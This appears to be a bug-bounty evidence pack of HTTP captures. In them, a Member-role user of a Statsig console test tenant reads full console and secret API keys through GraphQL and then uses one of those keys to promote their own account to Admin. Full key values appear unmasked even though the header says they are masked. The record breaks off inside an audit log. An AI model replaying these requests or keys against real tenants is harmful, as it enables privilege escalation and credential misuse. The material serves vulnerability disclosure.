@@ -1,0 +1,371 @@
+e103ef0a — triage evidence pack — live re-run 20 Oct 2026 — tenant 4n6HCY59mDqwX1iSZQtNvx
+All captures from one continuous session. Cookies redacted; key values masked first12...last4.
+Each request's real credential is re-derivable from the r3_02 keybox capture (attached).
+
+══════════════════════════ r3_01_members_role.txt ══════════════════════════
+POST /api/graphql?company_id=4n6HCY59mDqwX1iSZQtNvx HTTP/1.1
+Host: console.statsig.com
+Content-Type: application/json
+x-csrf-token: 1
+Origin: https://console.statsig.com
+Referer: https://console.statsig.com/4n6HCY59mDqwX1iSZQtNvx/api_keys
+Cookie: <MEMBER SESSION — redacted>
+
+{"id": "839712b20aeab3764ea9a7080e58cf5e", "operationName": null, "variables": {}}
+
+===== RESPONSE =====
+HTTP/1.1 200
+content-security-policy: upgrade-insecure-requests;base-uri 'self';script-src 'self' https://www.google.com/recaptcha/ https://www.gstatic.com/recaptcha/ https://dcs-worker.statsig.workers.dev/v1/download_config_specs/ https://*.statsigcdn.com/ https://cdn.console.statsig.com/ https://cdn.amplitude.com/ 'wasm-unsafe-eval' 'sha256-Fk0qgMP68Y3xjWeUiDvCif4CmwwVT+ImSHdCmA5iFlw=';report-uri /api/report_csp_violation;object-src 'none';form-action 'self';
+x-frame-options: DENY
+x-content-type-options: nosniff, nosniff
+server-timing: auth;dur=18.95849609375, execute;dur=11.8603515625
+cache-control: no-transform
+content-type: application/json; charset=utf-8
+x-statsig-friendly-name: 
+etag: "huwxzptmj3s0"
+content-length: 1008
+vary: Accept-Encoding
+date: Tue, 20 Oct 2026 00:18:11 GMT
+referrer-policy: strict-origin-when-cross-origin
+x-statsig-region: gke-us-west1
+set-cookie: <redacted>
+via: 1.1 google
+alt-svc: h3=":443"; ma=2592000,h3-29=":443"; ma=2592000
+
+{"data":{"viewer_company":{"organization":null,"all_roles_with_permissions":[{"name":"Admin"},{"name":"Owner"},{"name":"Member"},{"name":"Read Only"}],"members":{"edges":[{"roleName":"Member","node":{"id":"13B13WHITpDKkMpbi22BGW","full_name":"Bruno Hunter","email":"mohamed-9499-3@agentmail.to","is_viewer":true},"id":"CompanyMember:4n6HCY59mDqwX1iSZQtNvx>13B13WHITpDKkMpbi22BGW","__typename":"CompanyMembersEdge"},{"roleName":"Owner","node":{"id":"nZ2wI4FMJek95vjJHdnWR","full_name":"Amina Hunter","email":"mohamed-9499-2@agentmail.to","is_viewer":false},"id":"CompanyMember:4n6HCY59mDqwX1iSZQtNvx>nZ2wI4FMJek95vjJHdnWR","__typename":"CompanyMembersEdge"},{"roleName":"Member","node":{"id":"5mfafx6vDKTD1rosP4VuNz","full_name":"Sam Tester","email":"encouragingteacher162@agentmail.to","is_viewer":false},"id":"CompanyMember:4n6HCY59mDqwX1iSZQtNvx>5mfafx6vDKTD1rosP4VuNz","__typename":"CompanyMembersEdge"}]},"review_groups":[],"invited_emails":[],"pending_join_requests":[],"id":"4n6HCY59mDqwX1iSZQtNvx"}}}
+
+══════════════════════════ r3_02_keybox_ALL_leak.txt ══════════════════════════
+POST /api/graphql?company_id=4n6HCY59mDqwX1iSZQtNvx HTTP/1.1
+Host: console.statsig.com
+Content-Type: application/json
+x-csrf-token: 1
+Origin: https://console.statsig.com
+Referer: https://console.statsig.com/4n6HCY59mDqwX1iSZQtNvx/api_keys
+Cookie: <MEMBER SESSION — redacted>
+
+{"id": "d6fcaacbc921668f7e7aa576b9d2ca1e", "operationName": null, "variables": {"first": 50, "keyType": "ALL"}}
+
+===== RESPONSE =====
+HTTP/1.1 200
+content-security-policy: upgrade-insecure-requests;base-uri 'self';script-src 'self' https://www.google.com/recaptcha/ https://www.gstatic.com/recaptcha/ https://dcs-worker.statsig.workers.dev/v1/download_config_specs/ https://*.statsigcdn.com/ https://cdn.console.statsig.com/ https://cdn.amplitude.com/ 'wasm-unsafe-eval' 'sha256-Fk0qgMP68Y3xjWeUiDvCif4CmwwVT+ImSHdCmA5iFlw=';report-uri /api/report_csp_violation;object-src 'none';form-action 'self';
+x-frame-options: DENY
+x-content-type-options: nosniff, nosniff
+server-timing: parse;dur=0.442626953125, validate;dur=1.5068359375, auth;dur=13.662841796875, execute;dur=255.411865234375
+cache-control: no-transform
+content-type: application/json; charset=utf-8
+x-statsig-friendly-name: 
+etag: "sjncwsj7zv1cp"
+vary: Accept-Encoding
+content-encoding: gzip
+date: Tue, 20 Oct 2026 00:18:12 GMT
+referrer-policy: strict-origin-when-cross-origin
+x-statsig-region: gke-us-west1
+via: 1.1 google
+alt-svc: h3=":443"; ma=2592000,h3-29=":443"; ma=2592000
+
+{"data":{"viewer_company":{"id":"4n6HCY59mDqwX1iSZQtNvx","environments":[{"environmentName":"development"},{"environmentName":"staging"},{"environmentName":"production"}],"keys_connection":{"count":4,"nodes":[{"id":"5CN4qrxvBPP4kpZA5NDXa8","value":"console-TVZaWTUpt3y2E2QSDTJD1kqsEOEOHQlToOEYemf3aXU","created_time":1792455486,"is_active":true,"expiration_date":null,"description":"e103ef0a-r3","scopes":["omni_read_write"],"owner":null,"version":2,"enabled_environments":[],"type":"CONSOLE","target_app":null,"secondary_target_apps":[],"use_smart_targeting":false,"checked_sdks":[]},{"id":"5HawoKpgmVkzcRCsem7LWG","value":"console-ETK0Fnx3OhzKXocSi812uJxAo098UMfKfpvUnXj4aXB","created_time":1792455060,"is_active":true,"expiration_date":null,"description":"e103ef0a-r3","scopes":["omni_read_write"],"owner":null,"version":2,"enabled_environments":[],"type":"CONSOLE","target_app":null,"secondary_target_apps":[],"use_smart_targeting":false,"checked_sdks":[]},{"id":"4n6Qh4Fw4smWU499JM5sWH","value":"secret-ucD525YkpCEoOQ2yswXZVH7z3Y2AY3UgMligFtfhYKO","created_time":1789321809,"is_active":true,"expiration_date":null,"description":"","scopes":[],"owner":null,"version":2,"enabled_environments":null,"type":"SERVER","target_app":null,"secondary_target_apps":null,"use_smart_targeting":false,"checked_sdks":[]},{"id":"4n6Qh7ZAZ2FVwTf0W1WJyL","value":"client-bwxDp70sQvh5m9kvW73BXt0PgJIxCl02V3WMaFeNzA8","created_time":1789321809,"is_active":true,"expiration_date":null,"description":"","scopes":[],"owner":null,"version":1,"enabled_environments":null,"type":"CLIENT","target_app":null,"secondary_target_apps":null,"use_smart_targeting":false,"checked_sdks":[]}]}},"viewer":{"user":{"id":"13B13WHITpDKkMpbi22BGW"},"id":"viewer:13B13WHITpDKkMpbi22BGW"}}}
+
+══════════════════════════ r3_03_capi_section_leak.txt ══════════════════════════
+POST /api/graphql?company_id=4n6HCY59mDqwX1iSZQtNvx HTTP/1.1
+Host: console.statsig.com
+Content-Type: application/json
+x-csrf-token: 1
+Origin: https://console.statsig.com
+Referer: https://console.statsig.com/4n6HCY59mDqwX1iSZQtNvx/api_keys
+Cookie: <MEMBER SESSION — redacted>
+
+{"id": "0799d4b79f772f8f357d36dfc49f9a7a", "operationName": null, "variables": {}}
+
+===== RESPONSE =====
+HTTP/1.1 200
+content-security-policy: upgrade-insecure-requests;base-uri 'self';script-src 'self' https://www.google.com/recaptcha/ https://www.gstatic.com/recaptcha/ https://dcs-worker.statsig.workers.dev/v1/download_config_specs/ https://*.statsigcdn.com/ https://cdn.console.statsig.com/ https://cdn.amplitude.com/ 'wasm-unsafe-eval' 'sha256-Fk0qgMP68Y3xjWeUiDvCif4CmwwVT+ImSHdCmA5iFlw=';report-uri /api/report_csp_violation;object-src 'none';form-action 'self';
+x-frame-options: DENY
+x-content-type-options: nosniff, nosniff
+server-timing: parse;dur=0.21728515625, validate;dur=1.168701171875, auth;dur=16.58349609375, execute;dur=23.27734375
+cache-control: no-transform
+content-type: application/json; charset=utf-8
+x-statsig-friendly-name: 
+etag: "duttad5krhgq"
+content-length: 602
+vary: Accept-Encoding
+date: Tue, 20 Oct 2026 00:18:13 GMT
+referrer-policy: strict-origin-when-cross-origin
+x-statsig-region: gke-us-west1
+set-cookie: <redacted>
+via: 1.1 google
+alt-svc: h3=":443"; ma=2592000,h3-29=":443"; ma=2592000
+
+{"data":{"viewer":{"user":{"id":"13B13WHITpDKkMpbi22BGW"},"organization":null,"id":"viewer:13B13WHITpDKkMpbi22BGW"},"viewer_company":{"console_api_keys":[{"id":"5HawoKpgmVkzcRCsem7LWG","value":"console-ETK0Fnx3OhzKXocSi812uJxAo098UMfKfpvUnXj4aXB","created_time":1792455060,"is_active":true,"description":"e103ef0a-r3","scopes":["omni_read_write"],"owner":null},{"id":"5CN4qrxvBPP4kpZA5NDXa8","value":"console-TVZaWTUpt3y2E2QSDTJD1kqsEOEOHQlToOEYemf3aXU","created_time":1792455486,"is_active":true,"description":"e103ef0a-r3","scopes":["omni_read_write"],"owner":null}],"id":"4n6HCY59mDqwX1iSZQtNvx"}}}
+
+══════════════════════════ r3_04_onboarding_serverkey.txt ══════════════════════════
+POST /api/graphql?company_id=4n6HCY59mDqwX1iSZQtNvx HTTP/1.1
+Host: console.statsig.com
+Content-Type: application/json
+x-csrf-token: 1
+Origin: https://console.statsig.com
+Referer: https://console.statsig.com/4n6HCY59mDqwX1iSZQtNvx/api_keys
+Cookie: <MEMBER SESSION — redacted>
+
+{"id": "63df72f64b17f956f4b3dbe074f407ea", "operationName": null, "variables": {}}
+
+===== RESPONSE =====
+HTTP/1.1 200
+content-security-policy: upgrade-insecure-requests;base-uri 'self';script-src 'self' https://www.google.com/recaptcha/ https://www.gstatic.com/recaptcha/ https://dcs-worker.statsig.workers.dev/v1/download_config_specs/ https://*.statsigcdn.com/ https://cdn.console.statsig.com/ https://cdn.amplitude.com/ 'wasm-unsafe-eval' 'sha256-Fk0qgMP68Y3xjWeUiDvCif4CmwwVT+ImSHdCmA5iFlw=';report-uri /api/report_csp_violation;object-src 'none';form-action 'self';
+x-frame-options: DENY
+x-content-type-options: nosniff, nosniff
+server-timing: parse;dur=0.136962890625, validate;dur=1.140380859375, auth;dur=23.346435546875, execute;dur=7.516845703125
+cache-control: no-transform
+content-type: application/json; charset=utf-8
+x-statsig-friendly-name: 
+etag: "v21l9ambe34p"
+content-length: 169
+vary: Accept-Encoding
+date: Tue, 20 Oct 2026 00:18:15 GMT
+referrer-policy: strict-origin-when-cross-origin
+x-statsig-region: gke-us-west1
+via: 1.1 google
+alt-svc: h3=":443"; ma=2592000,h3-29=":443"; ma=2592000
+
+{"data":{"viewer_company":{"secret_keys":[{"value":"secret-ucD525YkpCEoOQ2yswXZVH7z3Y2AY3UgMligFtfhYKO","id":"4n6Qh4Fw4smWU499JM5sWH"}],"id":"4n6HCY59mDqwX1iSZQtNvx"}}}
+
+══════════════════════════ r3_05_rest_company.txt ══════════════════════════
+GET /console/v1/company HTTP/1.1
+Host: statsigapi.net
+STATSIG-API-KEY: console-TVZa...3aXU
+Accept: application/json
+
+===== RESPONSE =====
+HTTP/1.1 200
+access-control-allow-origin: *
+content-type: application/json; charset=utf-8
+statsig-final-byte-size: 208
+content-length: 208
+vary: Accept-Encoding
+date: Tue, 20 Oct 2026 00:18:18 GMT
+cache-control: no-transform
+referrer-policy: strict-origin-when-cross-origin
+x-content-type-options: nosniff
+x-statsig-region: gke-us-west1
+set-cookie: <redacted>
+via: 1.1 google
+alt-svc: h3=":443"; ma=2592000,h3-29=":443"; ma=2592000
+
+{"data":{"companyID":"4n6HCY59mDqwX1iSZQtNvx","companyName":"AmpHuntProject","isWarehouseNative":false,"orgID":null,"orgName":null,"resultsUpTo":1792281600000},"message":"Company Data retrieved successfully"}
+══════════════════════════ r3_06_rest_users.txt ══════════════════════════
+GET /console/v1/users HTTP/1.1
+Host: statsigapi.net
+STATSIG-API-KEY: console-TVZa...3aXU
+Accept: application/json
+
+===== RESPONSE =====
+HTTP/1.1 200
+access-control-allow-origin: *
+content-type: application/json; charset=utf-8
+statsig-final-byte-size: 567
+content-length: 567
+vary: Accept-Encoding
+date: Tue, 20 Oct 2026 00:18:20 GMT
+cache-control: no-transform
+referrer-policy: strict-origin-when-cross-origin
+x-content-type-options: nosniff
+x-statsig-region: gke-us-west1
+set-cookie: <redacted>
+via: 1.1 google
+alt-svc: h3=":443"; ma=2592000
+
+{"message":"User listed successfully.","data":[{"userID":"nZ2wI4FMJek95vjJHdnWR","email":"mohamed-9499-2@agentmail.to","firstName":"Amina","lastName":"Hunter","role":"Owner"},{"userID":"13B13WHITpDKkMpbi22BGW","email":"mohamed-9499-3@agentmail.to","firstName":"Bruno","lastName":"Hunter","role":"member"},{"userID":"5mfafx6vDKTD1rosP4VuNz","email":"encouragingteacher162@agentmail.to","firstName":"Sam","lastName":"Tester","role":"member"}],"pagination":{"itemsPerPage":100,"pageNumber":1,"totalItems":3,"nextPage":null,"previousPage":null,"all":"/console/v1/users"}}
+══════════════════════════ r3_06b_fabricated_key.txt ══════════════════════════
+GET /console/v1/company HTTP/1.1
+Host: statsigapi.net
+STATSIG-API-KEY: secret-00000...0000
+Accept: application/json
+
+===== RESPONSE =====
+HTTP/1.1 401
+cache-control: no-transform
+content-length: 12
+date: Tue, 20 Oct 2026 00:18:22 GMT
+referrer-policy: strict-origin-when-cross-origin
+x-content-type-options: nosniff
+x-statsig-region: gke-us-west1
+set-cookie: <redacted>
+via: 1.1 google
+alt-svc: h3=":443"; ma=2592000
+
+Unauthorized
+══════════════════════════ r3_07_control_personal_key_400.txt ══════════════════════════
+POST /console/v1/users/mohamed-9499-3@agentmail.to HTTP/1.1
+Host: statsigapi.net
+STATSIG-API-KEY: console-9XB6...odez
+Accept: application/json
+Content-Type: application/json
+
+{"role": "Admin"}
+
+===== RESPONSE =====
+HTTP/1.1 400
+access-control-allow-origin: *
+content-type: application/json; charset=utf-8
+statsig-final-byte-size: 66
+content-length: 66
+vary: Accept-Encoding
+date: Tue, 20 Oct 2026 00:18:29 GMT
+cache-control: no-transform
+referrer-policy: strict-origin-when-cross-origin
+x-content-type-options: nosniff
+x-statsig-region: gke-us-west1
+set-cookie: <redacted>
+via: 1.1 google
+alt-svc: h3=":443"; ma=2592000
+
+{"message":"Must be admin of project or project org","status":400}
+══════════════════════════ r3_08_escalation_201.txt ══════════════════════════
+POST /console/v1/users/mohamed-9499-3@agentmail.to HTTP/1.1
+Host: statsigapi.net
+STATSIG-API-KEY: console-TVZa...3aXU
+Accept: application/json
+Content-Type: application/json
+
+{"role": "Admin"}
+
+===== RESPONSE =====
+HTTP/1.1 201
+access-control-allow-origin: *
+content-type: application/json; charset=utf-8
+statsig-final-byte-size: 176
+content-length: 176
+vary: Accept-Encoding
+date: Tue, 20 Oct 2026 00:18:31 GMT
+cache-control: no-transform
+referrer-policy: strict-origin-when-cross-origin
+x-content-type-options: nosniff
+x-statsig-region: gke-us-west1
+set-cookie: <redacted>
+via: 1.1 google
+alt-svc: h3=":443"; ma=2592000
+
+{"message":"User updated successfully.","data":{"userID":"13B13WHITpDKkMpbi22BGW","email":"mohamed-9499-3@agentmail.to","firstName":"Bruno","lastName":"Hunter","role":"admin"}}
+══════════════════════════ r3_09_readback_admin.txt ══════════════════════════
+GET /console/v1/users HTTP/1.1
+Host: statsigapi.net
+STATSIG-API-KEY: console-TVZa...3aXU
+Accept: application/json
+
+===== RESPONSE =====
+HTTP/1.1 200
+access-control-allow-origin: *
+content-type: application/json; charset=utf-8
+statsig-final-byte-size: 566
+content-length: 566
+vary: Accept-Encoding
+date: Tue, 20 Oct 2026 00:18:33 GMT
+cache-control: no-transform
+referrer-policy: strict-origin-when-cross-origin
+x-content-type-options: nosniff
+x-statsig-region: gke-us-west1
+set-cookie: <redacted>
+via: 1.1 google
+alt-svc: h3=":443"; ma=2592000
+
+{"message":"User listed successfully.","data":[{"userID":"nZ2wI4FMJek95vjJHdnWR","email":"mohamed-9499-2@agentmail.to","firstName":"Amina","lastName":"Hunter","role":"Owner"},{"userID":"13B13WHITpDKkMpbi22BGW","email":"mohamed-9499-3@agentmail.to","firstName":"Bruno","lastName":"Hunter","role":"admin"},{"userID":"5mfafx6vDKTD1rosP4VuNz","email":"encouragingteacher162@agentmail.to","firstName":"Sam","lastName":"Tester","role":"member"}],"pagination":{"itemsPerPage":100,"pageNumber":1,"totalItems":3,"nextPage":null,"previousPage":null,"all":"/console/v1/users"}}
+══════════════════════════ r3_10_audit_logs.txt ══════════════════════════
+GET /console/v1/audit_logs HTTP/1.1
+Host: statsigapi.net
+STATSIG-API-KEY: console-TVZa...3aXU
+Accept: application/json
+
+===== RESPONSE =====
+HTTP/1.1 200
+access-control-allow-origin: *
+content-type: application/json; charset=utf-8
+statsig-final-byte-size: 38831
+vary: Accept-Encoding
+content-encoding: br
+date: Tue, 20 Oct 2026 00:18:36 GMT
+cache-control: no-transform
+referrer-policy: strict-origin-when-cross-origin
+x-content-type-options: nosniff
+x-statsig-region: gke-us-west1
+set-cookie: <redacted>
+via: 1.1 google
+alt-svc: h3=":443"; ma=2592000
+
+{"message":"Audit logs listed successfully.","data":[{"id":"2VuWlQsb9yBlCitjLC02vO","name":"CONSOLE API - console-wgBJaLH***************Key","changeLog":"Deleted SDK Key","actionType":"sdk_key_delete","date":"Sat Oct 17 2026","time":"17:08:30 GMT+0000 (Coordinated Universal Time)","updatedBy":"Amina Hunter","updatedByUserID":"nZ2wI4FMJek95vjJHdnWR","modifierEmail":"mohamed-9499-2@agentmail.to","changes":{},"tags":[],"targetAppIDs":[]},{"id":"2POZXLhYxCS2xyS0pfl1lh","name":"AmpHuntProject","changeLog":"Updated Bruno Hunter roles to Member","actionType":"batch_user_role_update","date":"Sat Oct 17 2026","time":"17:08:24 GMT+0000 (Coordinated Universal Time)","updatedBy":"CONSOLE API - console-wgBJaLH***************","updatedByUserID":"2K4aVXAXbWa6kd3XsJPltQ","modifierEmail":null,"changes":{},"tags":[],"targetAppIDs":[]},{"id":"2K8ml9bWoAqETAm3GC3oCG","name":"CONSOLE API - console-wgBJaLH***************Key","changeLog":"Created SDK Key","actionType":"sdk_key_create","date":"Sat Oct 17 2026","time":"17:08:19 GMT+0000 (Coordinated Universal Time)","updatedBy":"Amina Hunter","updatedByUserID":"nZ2wI4FMJek95vjJHdnWR","modifierEmail":"mohamed-9499-2@agentmail.to","changes":{},"tags":[],"targetAppIDs":[]},{"id":"2lXWjLh4wN3kvYtHCRuCbD","name":"CONSOLE API - console-sKkKKJN***************Key","changeLog":"Deleted SDK Key","actionType":"sdk_key_delete","date":"Sat Oct 17 2026","time":"17:07:58 GMT+0000 (Coordinated Universal Time)","updatedBy":"Amina Hunter","updatedByUserID":"nZ2wI4FMJek95vjJHdnWR","modifierEmail":"mohamed-9499-2@agentmail.to","changes":{},"tags":[],"targetAppIDs":[]},{"id":"2gfpXIg5Q9TjModd1VJhqy","name":"AmpHuntProject","changeLog":"Updated Bruno Hunter roles to Admin","actionType":"batch_user_role_update","date":"Sat Oct 17 2026","time":"17:07:53 GMT+0000 (Coordinated Universal Time)","updatedBy":"CONSOLE API - console-sKkKKJN***************","updatedByUserID":"1szJFQ0Ogvs4qtEih38e8U","modifierEmail":null,"changes":{},"tags":[],"targetAppIDs":[]},{"id":"29qlFrX6LbCuYcWs7mtmCA","name":"AmpHuntProject","changeLog":"Updated Bruno Hunter roles to Member","actionType":"batch_user_role_update","date":"Sat Oct 17 2026","time":"17:07:47 GMT+0000 (Coordinated Universal Time)","updatedBy":"CONSOLE API - console-sKkKKJN***************","updatedByUserID":"1szJFQ0Ogvs4qtEih38e8U","modifierEmail":null,"changes":{},"tags":[],"targetAppIDs":[]},{"id":"24WorIXc6DKinkmcynlitJ","name":"AmpHuntProject","changeLog":"Updated Bruno Hunter roles to Admin","actionType":"batch_user_role_update","date":"Sat Oct 17 2026","time":"17:07:43 GMT+0000 (Coordinated Universal Time)","updatedBy":"CONSOLE API - console-sKkKKJN***************","updatedByUserID":"1szJFQ0Ogvs4qtEih38e8U","modifierEmail":null,"changes":{},"tags":[],"targetAppIDs":[]},{"id":"1I1rLlRLRLMtxFlbqVRScG","name":"AmpHuntProject","changeLog":"Updated Amina Hunter roles to Admin","actionType":"batch_user_role_update","date":"Sat Oct 17 2026","time":"17:07:22 GMT+0000 (Coordinated Universal Time)","updatedBy":"CONSOLE API - console-sKkKKJN***************","updatedByUserID":"1szJFQ0Ogvs4qtEih38e8U","modifierEmail":null,"changes":{},"tags":[],"targetAppIDs":[]},{"id":"1Dv3dLBrQlpUsIiubGpfcE","name":"AmpHuntProject","changeLog":"Updated Amina Hunter roles to Member","actionType":"batch_user_role_update","date":"Sat Oct 17 2026","time":"17:07:18 GMT+0000 (Coordinated Universal Time)","updatedBy":"CONSOLE API - console-sKkKKJN***************","updatedByUserID":"1szJFQ0Ogvs4qtEih38e8U","modifierEmail":null,"changes":{},"tags":[],"targetAppIDs":[]},{"id":"1zunQlMrClpBNucRKJboPm","name":"AmpHuntProject","changeLog":"Updated Amina Hunter roles to Member","actionType":"batch_user_role_update","date":"Sat Oct 17 2026","time":"17:07:15 GMT+0000 (Coordinated Universal Time)","updatedBy":"CONSOLE API - console-sKkKKJN***************","updatedByUserID":"1szJFQ0Ogvs4qtEih38e8U","modifierEmail":null,"changes":{},"tags":[],"targetAppIDs":[]},{"id":"1sE3J8caaYF2WTMFeQXWIU","name":"CONSOLE API - console-sKkKKJN***************Key","changeLog":"Created SDK Key","actionType":"sdk_key_create","date":"Sat Oct 17 2026","time":"17:07:09 GMT+0000 (Coordinated Universal Time)","updatedBy":"Amina Hunter","updatedByUserID":"nZ2wI4FMJek95vjJHdnWR","modifierEmail":"mohamed-9499-2@agentmail.to","changes":{},"tags":[],"targetAppIDs":[]},{"id":"147byDQkvTAnlXqN26lafu","name":"CONSOLE API - console-IiT1s33***************Key","changeLog":"Deleted SDK Key","actionType":"sdk_key_delete","date":"Sat Oct 17 2026","time":"17:06:47 GMT+0000 (Coordinated Universal Time)","updatedBy":"Amina Hunter","updatedByUserID":"nZ2wI4FMJek95vjJHdnWR","modifierEmail":"mohamed-9499-2@agentmail.to","changes":{},"tags":[],"targetAppIDs":[]},{"id":"YaVu83hcPC6sAcjtEn56c","name":"CONSOLE API - console-6ZhqNQt***************Key","changeLog":"Deleted SDK Key","actionType":"sdk_key_delete","date":"Sat Oct 17 2026","time":"17:06:42 GMT+0000 (Coordinated Universal Time)","updatedBy":"Amina Hunter","updatedByUserID":"nZ2wI4FMJek95vjJHdnWR","modifierEmail":"mohamed-9499-2@agentmail.to","changes":{},"tags":[],"targetAppIDs":[]},{"id":"j7xneT3nUSq4nFVNf6V2n","name":"CONSOLE API - console-NBuHxOp***************Key","changeLog":"Deleted SDK Key","actionType":"sdk_key_delete","date":"Sat Oct 17 2026","time":"17:06:05 GMT+0000 (Coordinated Universal Time)","updatedBy":"Amina Hunter","updatedByUserID":"nZ2wI4FMJek95vjJHdnWR","modifierEmail":"mohamed-9499-2@agentmail.to","changes":{},"tags":[],"targetAppIDs":[]},{"id":"e79KOvZoPVUk8i4ni4sRW","name":"CONSOLE API - console-13TXxtW***************Key","changeLog":"Deleted SDK Key","actionType":"sdk_key_delete","date":"Sat Oct 17 2026","time":"17:06:01 GMT+0000 (Coordinated Universal Time)","updatedBy":"Amina Hunter","updatedByUserID":"nZ2wI4FMJek95vjJHdnWR","modifierEmail":"mohamed-9499-2@agentmail.to","changes":{},"tags":[],"targetAppIDs":[]},{"id":"01fYdzMzki7e1gfuq2gWjj","name":"AmpHuntProject","changeLog":"Updated Project Default User Role","actionType":"set_company_default_user_role","date":"Sat Oct 17 2026","time":"17:05:49 GMT+0000 (Coordinated Universal Time)","updatedBy":"CONSOLE API - console-13TXxtW***************","updatedByUserID":"6QrzgYHKnrOoLx55IbXdW5","modifierEmail":null,"changes":{},"tags":[],"targetAppIDs":[]},{"id":"7JQoPnBEOVEA0UhVLqsfaV","name":"AmpHuntProject","changeLog":"Updated Project Default User Role","actionType":"set_company_default_user_role","date":"Sat Oct 17 2026","time":"17:05:45 GMT+0000 (Coordinated Universal Time)","updatedBy":"CONSOLE API - console-13TXxtW***************","updatedByUserID":"6QrzgYHKnrOoLx55IbXdW5","modifierEmail":null,"changes":{},"tags":[],"targetAppIDs":[]},{"id":"7FRCboHB8wmTILWXdgRiFA","name":"AmpHuntProject","changeLog":"Updated Project Default User Role","actionType":"set_company_default_user_role","date":"Sat Oct 17 2026","time":"17:05:42 GMT+0000 (Coordinated Universal Time)","updatedBy":"CONSOLE API - console-13TXxtW***************","updatedByUserID":"6QrzgYHKnrOoLx55IbXdW5","modifierEmail":null,"changes":{},"tags":[],"targetAppIDs":[]},{"id":"7Bn6nfmdEGIXa8g8spOCSs","name":"taint_gate_probe","changeLog":"Deleted Config","actionType":"config_delete","date":"Sat Oct 17 2026","time":"17:05:38 GMT+0000 (Coordinated Universal Time)","updatedBy":"Bruno Hunter via CONSOLE API","updatedByUserID":"13B13WHITpDKkMpbi22BGW","modifierEmail":"mohamed-9499-3@agentmail.to","changes":{},"tags":[],"targetAppIDs":[]},{"id":"7wI3J6oegC5UoOKzQYloWj","name":"taint_gate_probe","changeLog":"Created Gate","actionType":"gate_create","date":"Sat Oct 17 2026","time":"17:05:34 GMT+0000 (Coordinated Universal Time)","updatedBy":"Bruno Hunter via CONSOLE API","updatedByUserID":"13B13WHITpDKkMpbi22BGW","modifierEmail":"mohamed-9499-3@agentmail.to","changes":{},"tags":[],"targetAppIDs":[]},{"id":"7q2Tmm4cUGzmSOdle6N8bu","name":"AmpHuntProject","changeLog":"Updated Bruno Hunter roles to Member","actionType":"batch_user_role_update","date":"Sat Oct 17 2026","time":"17:05:28 GMT+0000 (Coordinated Universal Time)","updatedBy":"CONSOLE API - console-13TXxtW***************","updatedByUserID":"6QrzgYHKnrOoLx55IbXdW5","modifierEmail":null,"changes":{},"tags":[],"targetAppIDs":[]},{"id":"7mthty2fO5meAJBSOwIjpz","name":"AmpHuntProject","changeLog":"Updated Bruno Hunter roles to Admin","actionType":"batch_user_role_update","date":"Sat Oct 17 2026","time":"17:05:25 GMT+0000 (Coordinated Universal Time)","updatedBy":"CONSOLE API - console-13TXxtW***************","updatedByUserID":"6QrzgYHKnrOoLx55IbXdW5","modifierEmail":null,"changes":{},"tags":[],"targetAppIDs":[]},{"id":"7iXVjYTtg2SUJEeXwJENBo","name":"AmpHuntProject","changeLog":"Updated Bruno Hunter roles to Member","actionType":"batch_user_role_update","date":"Sat Oct 17 2026","time":"17:05:21 GMT+0000 (Coordinated Universal Time)","updatedBy":"CONSOLE API - console-13TXxtW***************","updatedByUserID":"6QrzgYHKnrOoLx55IbXdW5","modifierEmail":null,"changes":{},"tags":[],"targetAppIDs":[]},{"id":"7fDAgO5CxUQzha56G6SMCV","name":"AmpHuntProject","changeLog":"Updated Bruno Hunter roles to Admin","actionType":"batch_user_role_update","date":"Sat Oct 17 2026","time":"17:05:18 GMT+0000 (Coordinated Universal Time)","updatedBy":"CONSOLE API - console-13TXxtW***************","updatedByUserID":"6QrzgYHKnrOoLx55IbXdW5","modifierEmail":null,"changes":{},"tags":[],"targetAppIDs":[]},{"id":"7bxxZiGw6Mz6uR7yEzIROn","name":"AmpHuntProject","changeLog":"Updated Bruno Hunter roles to Member","actionType":"batch_user_role_update","date":"Sat Oct 17 2026","time":"17:05:15 GMT+0000 (Coordinated Universal Time)","updatedBy":"CONSOLE API - console-13TXxtW***************","updatedByUserID":"6QrzgYHKnrOoLx55IbXdW5","modifierEmail":null,"changes":{},"tags":[],"targetAppIDs":[]},{"id":"77tk7aUaRkx5wr3AOa6hu0","name":"AmpHuntProject","changeLog":"Updated Bruno Hunter roles to Admin","actionType":"batch_user_role_update","date":"Sat Oct 17 2026","time":"17:05:11 GMT+0000 (Coordinated Universal Time)","updatedBy":"CONSOLE API - console-13TXxtW***************","updatedByUserID":"6QrzgYHKnrOoLx55IbXdW5","modifierEmail":null,"changes":{},"tags":[],"targetAppIDs":[]},{"id":"6WrAOmkGLHdXvm4DJ2DXlE","name":"CONSOLE API - console-NBuHxOp***************Key","changeLog":"Created SDK Key","actionType":"sdk_key_create","date":"Sat Oct 17 2026","time":"17:05:01 GMT+0000 (Coordinated Universal Time)","updatedBy":"Amina Hunter","updatedByUserID":"nZ2wI4FMJek95vjJHdnWR","modifierEmail":"mohamed-9499-2@agentmail.to","changes":{},"tags":[],"targetAppIDs":[]},{"id":"6QBT8Q6QGfxneVt4wWUGm1","name":"CONSOLE API - console-13TXxtW***************Key","changeLog":"Created SDK Key","actionType":"sdk_key_create","date":"Sat Oct 17 2026","time":"17:04:56 GMT+0000 (Coordinated Universal Time)","updatedBy":"Amina Hunter","updatedByUserID":"nZ2wI4FMJek95vjJHdnWR","modifierEmail":"mohamed-9499-2@agentmail.to","changes":{},"tags":[],"targetAppIDs":[]},{"id":"6kh8DLIlLXnnvwdIEs5sub","name":"CONSOLE API - console-6ZhqNQt***************Key","changeLog":"Created SDK Key","actionType":"sdk_key_create","date":"Sat Oct 17 2026","time":"17:04:27 GMT+0000 (Coordinated Universal Time)","updatedBy":"Amina Hunter","updatedByUserID":"nZ2wI4FMJek95vjJHdnWR","modifierEmail":"mohamed-9499-2@agentmail.to","changes":{},"tags":[],"targetAppIDs":[]},{"id":"6dN81xYFq3nPzVQvhmKdf4","name":"CONSOLE API - console-IiT1s33***************Key","changeLog":"Created SDK Key","actionType":"sdk_key_create","date":"Sat Oct 17 2026","time":"17:04:22 GMT+0000 (Coordinated Universal Time)","updatedBy":"Amina Hunter","updatedByUserID":"nZ2wI4FMJek95vjJHdnWR","modifierEmail":"mohamed-9499-2@agentmail.to","changes":{},"tags":[],"targetAppIDs":[]},{"id":"6i3Q0Ua2quppB8I02Ty75a","name":"AmpHuntProject","changeLog":"Updated Project Default User Role","actionType":"set_company_default_user_role","date":"Sat Oct 17 2026","time":"14:26:57 GMT+0000 (Coordinated Universal Time)","updatedBy":"Amina 